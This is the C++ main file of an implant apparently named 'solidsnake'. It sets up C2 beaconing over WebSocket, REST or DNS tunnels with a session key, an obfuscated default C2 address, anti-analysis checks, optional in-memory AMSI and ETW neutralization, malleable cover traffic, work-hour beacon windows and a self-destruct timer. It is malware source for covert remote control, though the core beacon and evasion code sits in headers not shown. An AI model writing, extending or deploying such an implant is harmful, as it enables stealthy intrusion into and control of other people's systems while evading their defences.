#include <cstdio>
#include <cstdlib>
#include <string>

#include "snake/antianalysis.hpp"
#include "snake/crypto.hpp"
#include "snake/evade.hpp"
#include "snake/implant.hpp"
#include "snake/malleable.hpp"
#include "snake/stealth.hpp"

namespace {

void usage() {
    std::printf(
        "usage: solidsnake [flags]\n"
        "  --c2 <url>          C2 WebSocket URL (default %s)\n"
        "  --dns <domain>      DNS tunnel fallback domain\n"
        "  --dns-resolver <ip:port>  raw-UDP resolver override (default: system resolver)\n"
        "  --channel <mode>    auto | ws | rest | dns (default auto: ws -> rest -> dns)\n"
        "  --beacon-min <s>    min beacon interval seconds (default 60)\n"
        "  --beacon-max <s>    max beacon interval seconds (default 300)\n"
        "  --key <hex>         session key hex (32 bytes; generated + printed if empty)\n"
        "  --debug             verbose logging\n"
        "  --insecure          skip TLS certificate verification (self-signed C2)\n"
        "  --ca <file>         PEM file with CA / server certificate to trust\n"
        "  --fingerprint <fp>  pin C2 certificate by SHA-256 fingerprint (hex)\n"
        "  --once              single beacon cycle then exit (testing aid)\n"
        "  --id <hex>          fixed implant ID (testing aid)\n"
        "  --kill-date <date>  YYYY-MM-DD or YYYY-MM-DDTHH:MM (UTC) - self-destruct at that instant\n"
        "  --max-runtime <dur> deadman switch: self-destruct after <dur> of runtime (e.g. 90s, 1h30m)\n"
        "  --work-hours <a-b>  local-time beacon window HH:MM-HH:MM (e.g. 09:00-17:00; may wrap midnight)\n"
        "  --work-days <set>   local weekdays to beacon: mon-fri, sat,sun or 0-6 (0=Sun)\n"
        "  --analysis-threshold <n>  score the anti-analysis readings; hostile at score >= n\n"
        "  --analysis-paranoid       preset: same signals, low threshold (mutually exclusive)\n"
        "  --evade <list>      opt in to in-memory neutralization: amsi, etw (Windows; no-op elsewhere)\n"
        "  --profile <file>    malleable traffic profile (headers, user-agent, paths, cover traffic)\n",
        SNAKE_OBF("wss://127.0.0.1:4443/ws").c_str());
}

}  // namespace

int main(int argc, char** argv) {
    snake::ImplantConfig cfg;
    cfg.c2_url = SNAKE_OBF("wss://127.0.0.1:4443/ws");
    std::string key_hex;
    std::string kill_date, max_runtime, work_hours, work_days, analysis_threshold;
    std::string evade_list;
    std::string profile_file;
    bool analysis_paranoid = false;
    bool evade_given = false;

    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&](const char* flag) -> std::string {
            if (i + 1 >= argc) {
                std::fprintf(stderr, "missing value for %s\n", flag);
                std::exit(2);
            }
            return argv[++i];
        };
        if (a == "--c2") {
            cfg.c2_url = next("--c2");
        } else if (a == "--dns") {
            cfg.dns_domain = next("--dns");
        } else if (a == "--dns-resolver") {
            cfg.dns_resolver = next("--dns-resolver");
        } else if (a == "--channel") {
            cfg.channel = next("--channel");
        } else if (a == "--beacon-min") {
            cfg.beacon_min = std::atoi(next("--beacon-min").c_str());
        } else if (a == "--beacon-max") {
            cfg.beacon_max = std::atoi(next("--beacon-max").c_str());
        } else if (a == "--key") {
            key_hex = next("--key");
        } else if (a == "--debug") {
            cfg.debug = true;
        } else if (a == "--insecure") {
            cfg.skip_tls_verify = true;
        } else if (a == "--ca") {
            cfg.ca_file = next("--ca");
        } else if (a == "--fingerprint") {
            cfg.fingerprint = next("--fingerprint");
        } else if (a == "--once") {
            cfg.once = true;
        } else if (a == "--kill-date") {
            kill_date = next("--kill-date");
        } else if (a == "--max-runtime") {
            max_runtime = next("--max-runtime");
        } else if (a == "--work-hours") {
            work_hours = next("--work-hours");
        } else if (a == "--work-days") {
            work_days = next("--work-days");
        } else if (a == "--analysis-threshold") {
            analysis_threshold = next("--analysis-threshold");
        } else if (a == "--analysis-paranoid") {
            analysis_paranoid = true;
        } else if (a == "--evade") {
            evade_list = next("--evade");
            evade_given = true;
        } else if (a == "--profile") {
            profile_file = next("--profile");
        } else if (a == "--id") {
            cfg.forced_id = next("--id");
        } else if (a == "-h" || a == "--help") {
            usage();
            return 0;
        } else {
            std::fprintf(stderr, "unknown flag: %s\n", a.c_str());
            usage();
            return 2;
        }
    }

    if (key_hex.empty()) {
        cfg.session_key = snake::random_bytes(32);
        std::fprintf(stderr, "[implant] generated session key (provision C2 with -key): %s\n",
                     snake::to_hex(cfg.session_key).c_str());
    } else {
        auto k = snake::from_hex(key_hex);
        if (!k || k->size() != 32) {
            std::fprintf(stderr, "bad --key: must be 64 hex chars (32 bytes)\n");
            return 2;
        }
        cfg.session_key = *k;
    }

    std::string life_err;
    if (!snake::lifetime_policy_parse(kill_date, max_runtime, cfg.lifetime, life_err)) {
        std::fprintf(stderr, "%s\n", life_err.c_str());
        return 2;
    }

    std::string sched_err;
    if (!snake::schedule_policy_parse(work_hours, work_days, cfg.schedule, sched_err)) {
        std::fprintf(stderr, "%s\n", sched_err.c_str());
        return 2;
    }

    std::string analysis_err;
    if (!snake::analysis_policy_parse(analysis_threshold, analysis_paranoid, cfg.analysis,
                                      analysis_err)) {
        std::fprintf(stderr, "%s\n", analysis_err.c_str());
        return 2;
    }

    std::string evade_err;
    if (evade_given && !snake::evade::evade_policy_parse(evade_list, cfg.evade, evade_err)) {
        std::fprintf(stderr, "%s\n", evade_err.c_str());
        return 2;
    }

    if (!profile_file.empty()) {
        std::string profile_err;
        if (!snake::malleable::profile_load(profile_file, cfg.profile, profile_err)) {
            std::fprintf(stderr, "%s\n", profile_err.c_str());
            return 2;
        }
    }

    snake::Implant im(std::move(cfg));
    return im.run();
}
